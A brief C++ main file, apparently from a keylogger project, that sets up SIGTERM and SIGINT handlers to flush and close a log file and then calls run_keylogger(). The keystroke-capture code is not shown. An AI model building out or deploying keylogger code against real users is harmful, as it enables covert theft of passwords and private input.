#include "keylogger_interface.h"
#include "logger_utils.h"
#include <csignal>
#include <cstdlib>

extern std::ofstream logfile;

void handle_signal(int signal) {
    if (signal == SIGTERM || signal == SIGINT) {
        logfile << "\n[INFO] Program terminated by signal " << signal << "\n";
        logfile.flush();
        logfile.close();
        std::exit(0);
    }
}

int main() {
    std::signal(SIGTERM, handle_signal);
    std::signal(SIGINT, handle_signal);
    run_keylogger();
    return 0;
}
